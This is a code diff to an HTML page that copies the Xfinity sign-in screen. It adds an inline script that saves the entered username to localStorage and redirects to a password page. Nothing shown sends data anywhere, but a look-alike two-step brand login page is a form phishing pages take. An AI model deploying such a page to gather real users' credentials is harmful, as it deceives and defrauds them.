@@ -11,19 +11,22 @@
   <div class="container">
     <h1>Sign in with your Xfinity ID</h1>
 
-    <input
-      type="text"
-      id="username"
-      placeholder="Email, mobile, or username"
-    />
+    <div id="step1">
+      <input
+        type="text"
+        id="username"
+        placeholder="Email, mobile, or username"
+        required
+      />
 
-    <p class="terms">
-      By signing in, you agree to our
-      <a href="#">Terms of Service</a> and
-      <a href="#">Privacy Policy</a>.
-    </p>
+      <p class="terms">
+        By signing in, you agree to our
+        <a href="#">Terms of Service</a> and
+        <a href="#">Privacy Policy</a>.
+      </p>
 
-    <button onclick="goNext()">Let’s go</button>
+      <button onclick="goNext()">Let’s go</button>
+    </div>
 
     <div class="links">
       <div class="link-item">New to Xfinity? View exclusive offers near you →</div>
@@ -32,6 +35,22 @@
     </div>
   </div>
 
-  <script src="script.js"></script>
+  <script>
+    function goNext() {
+      const username = document.getElementById("username").value.trim();
+
+      if (!username) {
+        alert("Please enter your Xfinity ID.");
+        return;
+      }
+
+      // Save username for the next page
+      localStorage.setItem("Xfinity", username);
+
+      // Move to password page
+      window.location.href = "password.html";
+    }
+  </script>
+
 </body>
 </html>
